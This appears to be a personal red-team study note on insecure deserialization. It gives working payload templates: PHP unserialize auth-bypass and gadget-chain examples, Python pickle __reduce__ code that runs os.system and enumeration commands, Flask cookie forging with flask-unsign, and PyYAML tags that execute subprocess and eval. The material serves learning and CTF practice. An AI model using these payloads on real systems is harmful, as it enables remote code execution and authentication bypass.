# Insecure Deserialization

[![owasptop10](../../../../_badges/thm/owasptop10.svg)](https://tryhackme.com/room/owasptop10)
[![deserialization](../../../../_badges/owasp/deserialization.svg)](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

<div class="row row-cols-lg-2"><div>

Insecure Deserialization is a vulnerability that occurs when the deserialization process can be exploited to run malicious code.
</div><div>
</div></div>

<hr class="sep-both">

## SerializedVariable Deserialization ‚Äî PHP

[![php_deserialization](../../../../_badges/poat/php_deserialization.svg)](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP/)
[![php_serialization](../../../../_badges/rootme/web_server/php_serialization.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization)
[![php_unserialize_pop_chain](../../../../_badges/rootme/web_server/php_unserialize_pop_chain.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Unserialize-Pop-Chain)

<div class="row row-cols-lg-2"><div>

The [serialize](https://www.php.net/manual/en/function.serialize.php) function can be used to convert an object to a serialized string that can be loaded back using [unserialize](https://www.php.net/manual/en/function.unserialize.php).

If the serialized data is user-controlled, we may be able to:

* üèÅ Invoke defined methods using autoloading <small>(e.g. not arbitrary)</small>
* üî´ Manipulate data to exploit the code <small>(e.g. auth-bypass)</small>

#### SerializedVariable ‚Äî Data Manipulation

We may be able to bypass some checks or set some attributes.

```php!
$serialized = serialize(['user'=>'guest', 'is_admin'=>false]);
// a:2:{s:4:"user";s:5:"guest";s:8:"is_admin";b:0;}
$data = unserialize('a:2:{s:4:"user";s:5:"guest";s:8:"is_admin";b:1;}');
// ['user'=>'guest', 'is_admin'=>true]
```

This can be further exploited if there are some [logic flaws](/cybersecurity/red-team/s2.discovery/techniques/websites/logic_flaws.md#php-loose-comparison-and-type-juggling).
</div><div>

#### SerializedVariable ‚Äî Program Flow Manipulation

When unserializing an object, the method `__wakeup` is automatically called. This method may contain code that may be further exploited.

While we may write code logic, we may be able to create a suite successive method calls is called a **gadget chain** ü§ñ.

```php!
class Foo {}
class Bar
{
    public function __wakeup(): void {
        echo $this; // invoke __toString
    }

    public function __toString(): string {
        return "Bar.__toString";
    }

    // will be called when destroyed
    public function __destruct() { echo "Bar.__destruct"; }
}

$x = new Foo();      
$x->attr = new Bar();       // who cares 'attr' doesn't exist
unserialize(serialize($x)); // __wakeup will still be called
```

They can be exploited to gain RCE. Refer to [phpggc](https://github.com/ambionics/phpggc) <small>(3.0k ‚≠ê)</small>.
</div></div>

<hr class="sep-both">

## Pickle Deserialization ‚Äî Python

[![python_pickle](../../../../_badges/rootme/app_script/python_pickle.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-pickle)

<div class="row row-cols-lg-2"><div>

The python [pickle module](https://docs.python.org/3/library/pickle.html) can be used for object serialization, while it's explicitly stated that it shouldn't be used with untrusted input.

You can either use `__reduce__` or use a function following [checkoway](https://checkoway.net/musings/pickle/) article, the latter being *sightly* more complex.

```py
class Exploit(object):
    def __reduce__(self):
        # write your code here
```

To test your exploit

```py
payload = pickle.dumps(Exploit())
pickle.loads(payload)
```
</div><div>

A few code samples:

```py
        import os
        return (os.system, ("echo 'Hello, World!'",))
```

```py
        import os
        raise Exception(os.popen("whoami;id;pwd;ls -1a").read())
```

You may alternatively use pickle bytecode:

* [Pickora](https://github.com/splitline/Pickora) <small>(0.1k ‚≠ê, 2023 ü™¶)</small>
* [pickleassem](https://github.com/gousaiyang/pickleassem) <small>(0.01k ‚≠ê, 2021 ü™¶)</small>
</div></div>

<hr class="sep-both">

## Example CVEs

<div class="row row-cols-lg-2"><div>

#### CVE-2021-33026 (Flask/Python)

[![owasptop10](../../../../_badges/thm/owasptop10.svg)](https://tryhackme.com/room/owasptop10)
[![flask_unsecure_session](../../../../_badges/rootme/web_server/flask_unsecure_session.svg)](https://www.root-me.org/en/Challenges/Web-Server/Flask-Unsecure-session)

An insure deserialization in Flask (Python) allowed  a hacker to craft a malicious [cookie](/programming-languages/web/_general/random/cookies.md) with a command inside. When the cookie was deserialized, the command was executed by the server.

* Cookies can be read without the secret key
* Cookies can be forged with the secret key
* [kirsle flask cookie reader](https://www.kirsle.net/wizards/flask-session.cgi) (Website)
* See also: [flask-session-manager](https://github.com/noraj/flask-session-cookie-manager) <small>(0.6k ‚≠ê)</small> or [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign)  <small>(0.4k ‚≠ê)</small>

```shell!
$ pip3 install flask-unsign[wordlist]
$ sudo ln -s /home/<xxx>/.local/bin/flask-unsign /usr/bin/flask-unsign
$ flask-unsign --decode --cookie 'cookie'        # decode
$ flask-unsign --unsign --cookie 'cookie'        # find key
$ flask-unsign --sign --cookie '' --secret 'dev' # encode
```
</div><div>

#### Yaml Deserialization - PyYAML

[![python_yaml_deserialization](../../../../_badges/hacktricks/python_yaml_deserialization.svg)](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
[![yaml_deserialization](../../../../_badges/poat/yaml_deserialization.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/YAML.md)
[![yaml_deserialization](../../../../_badges/rootme/web_server/yaml_deserialization.svg)](https://www.root-me.org/en/Challenges/Web-Server/Yaml-Deserialization)

PyYAML version 6 and below instanciated by default an insecure parser which could be exploited to run python code.

```yaml!
xxx: !!python/object/apply:time.sleep [2]
```

The `xxx:` is only necessary if a specific element <small>(e.g., xxx)</small> is rendered.

```yaml!
!!python/object/apply:builtins.range [1,10,1]
!!python/object/apply:subprocess.Popen ["ls"]
!!python/object/apply:subprocess.check_output [['ls', '-la']]
!!python/object/apply:builtins.eval [ "5" ]
!!python/object/apply:builtins.eval [ "__import__('subprocess') or 'error'" ]
!!python/object/apply:builtins.eval [ "__import__('subprocess').check_output(['ls', '-l']).decode('utf-8') or 'error'" ]
```

‚û°Ô∏è See also: [python-deserialization-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) <small>(0.1k ‚≠ê)</small>.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [ysoserial](https://github.com/frohoff/ysoserial) (Java object deserialization)
</div><div>
</div></div>